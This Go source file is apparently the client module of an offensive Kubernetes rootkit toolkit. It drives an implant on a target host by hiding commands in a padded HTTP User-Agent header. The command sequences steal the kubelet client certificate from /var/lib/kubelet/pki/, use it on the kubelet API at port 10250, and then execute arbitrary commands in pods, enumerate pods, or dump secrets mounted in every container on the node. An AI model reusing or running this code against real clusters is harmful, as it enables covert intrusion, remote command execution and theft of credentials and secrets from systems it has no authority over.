package kubelet_abuse

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type AbuseResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, action, nodeIP, podName, command, output string) error {
	result := &AbuseResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch action {
	case "exec":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"steal_node_creds", "extract kubelet client certificate from /var/lib/kubelet/pki/", "kubelet_steal_creds"},
			{"connect_kubelet", "connect to kubelet API on port 10250 with stolen credentials", "kubelet_connect"},
			{"exec_in_pod", "execute arbitrary command in target pod via /exec endpoint", "kubelet_exec"},
		}
	case "list":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"steal_node_creds", "extract kubelet client certificate from /var/lib/kubelet/pki/", "kubelet_steal_creds"},
			{"connect_kubelet", "connect to kubelet API on port 10250 with stolen credentials", "kubelet_connect"},
			{"list_pods", "enumerate all pods running on the node via /pods endpoint", "kubelet_list_pods"},
		}
	default: // secrets
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"steal_node_creds", "extract kubelet client certificate from /var/lib/kubelet/pki/", "kubelet_steal_creds"},
			{"connect_kubelet", "connect to kubelet API on port 10250 with stolen credentials", "kubelet_connect"},
			{"dump_secrets", "read mounted secrets from all containers on the node", "kubelet_dump_secrets"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + nodeIP + "#" + podName + "#" + command
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/kubelet_abuse", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
